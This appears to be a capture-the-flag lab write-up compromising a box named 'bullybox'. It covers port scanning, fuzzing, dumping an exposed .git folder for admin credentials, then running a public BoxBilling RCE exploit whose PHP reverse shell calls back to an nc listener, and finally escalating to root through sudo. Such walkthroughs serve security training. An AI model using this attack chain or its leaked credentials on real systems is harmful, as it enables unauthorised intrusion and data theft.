## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.148.27
# HOSTNAME
bullybox
# OPERATING SYSTEM
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
PRETTY_NAME="Ubuntu 22.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.2 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
```
# ENUMERATION
## PORT 80
```bash
# Nmap
- 80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
- Server: Apache httpd 2.4.52 ((Ubuntu))
- bullybox.local add to /etc/hosts

- Accessing http://bullybox.local - Found - Box billing site
- Exploits
	- BoxBilling<=4.22.1.5 - Remote Code Execution (RCE) | php/webapps/51108.txt
		- Shows "# In order to exploit the vulnerability, an attacker must have a valid authenticated session as admin on the CMS."
	- https://github.com/kabir0x23/CVE-2022-3552

- Fuzzing 
	- Files
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -of md -o fuzz/ffuf-raft-large-files -fc 403,404 -u http://bullybox.local/FUZZ -fs 3971
index.php               [Status: 200, Size: 10462, Words: 3564, Lines: 265, Duration: 205ms]                                                                              
robots.txt              [Status: 200, Size: 716, Words: 77, Lines: 21, Duration: 41ms]                                                                                    
sitemap.xml             [Status: 200, Size: 1719, Words: 295, Lines: 54, Duration: 73ms]                                                                                  
.git                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 66ms]                                                                                    
bb-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms]                                                                                        
rb.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]                                                                                        
bb-load.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]  
	- Directories
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of md -o fuzz/ffuf-raft-large-directories -fc 403,404 -u http://bullybox.local/FUZZ/ -fs 3971
api                     [Status: 200, Size: 66, Words: 4, Lines: 1, Duration: 148ms]
bb-admin                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]

- Dumping .git folder using git-dumper
sudo git-dumper http://bullybox.local/.git ./git-site

- Found Credentials bb-config.php inside the dumped git folder
    'type' => 'mysql',
    'host' => 'localhost',
    'name' => 'boxbilling',
    'user' => 'admin',
    'password' => 'Playing-Unstylish7-Provided',

- Found user email on ./.git/logs/HEAD
admin@bullybox.local

# Credentials
Email: admin@bullybox.local
Password: Playing-Unstylish7-Provided

- Tried login on http://bullybox.local/
	- Login Failed 
- Tried Accessing http://bullybox.local/bb-admin  
	- It redirects to http://bullybox.local/bb-admin/staff/login page
	- Using the creds Email: admin@bullybox.local Password: Playing-Unstylish7-Provided | WORKED :)
```
## PORT 22
```bash
# Nmap
- 22/tcp open ssh syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
```

## INITIAL FOOTHOLD
```bash
# Using Exploith
	- https://github.com/kabir0x23/CVE-2022-3552
	- Since we have admin credentials
	- Edit the php reverse shell on the script with our IP and Port 80

sudo nc -nvlp 80
sudo python3 CVE-2022-3552.py -d http://bullybox.local -u admin@bullybox.local -p Playing-Unstylish7-Provided
[+] Successfully logged in
[+] Payload saved successfully
[+] Getting Shell

 sudo nc -nvlp 80             
listening on [any] 80 ...
connect to [192.168.45.190] from (UNKNOWN) [192.168.148.27] 53906
Linux bullybox 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 09:14:54 up 25 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
```
## PRIVILEGE ESCALATION
```bash
- Since user yuki is on the sudo group 27(sudo)

$ id
uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)

$ sudo -l
Matching Defaults entries for yuki on bullybox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User yuki may run the following commands on bullybox:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
$ sudo su
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Sat Nov 30 13:21:52 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.148.27
Nmap scan report for 192.168.148.27
Host is up, received reset ttl 61 (0.041s latency).
Scanned at 2024-11-30 13:21:54 IST for 23s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 30 13:22:17 2024 -- 1 IP address (1 host up) scanned in 25.38 seconds

```

